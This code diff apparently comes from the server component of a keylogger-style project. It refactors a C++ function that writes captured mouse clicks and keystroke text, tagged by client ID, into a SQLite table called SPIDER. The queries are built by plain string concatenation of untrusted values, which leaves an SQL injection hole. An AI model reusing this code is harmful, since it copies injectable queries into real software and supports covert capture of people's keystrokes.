@@ -56,19 +56,23 @@ void DataBaseLog::insert(APacket const &param, std::string const &id) {
     param.to_readable(_dataBaseParser);
 
     _dataBaseParser.get("Type", type);
-    switch (type) {
-        case PacketType::MOUSECLICK:
+    switch (static_cast<APacket::PacketType>(type)) {
+        case APacket::PacketType::MOUSECLICK:
 
             _dataBaseParser.get("X", x);
             _dataBaseParser.get("Y", y);
             _dataBaseParser.get("Button", button);
             query += "INSERT INTO SPIDER(x, y, button, client_id) VALUES(" + x + ", " + y + ", "  + button + ", " + id + ");";
             break;
-        case PacketType::KEYSTROKES:
+        case APacket::PacketType::KEYSTROKES: {
             std::string text = "";
 
             _dataBaseParser.get("Data", text);
             query += "INSERT INTO SPIDER(text, client_id) VALUES(\"" + text + "\", " + id + ");";
+            break;
+        }
+        default:
+            throw std::runtime_error("Non handled types");
             break;
     }
     int ret = sqlite3_exec(_sqlDataBase, query.c_str(), nullptr, nullptr, &sqlErrMsg);
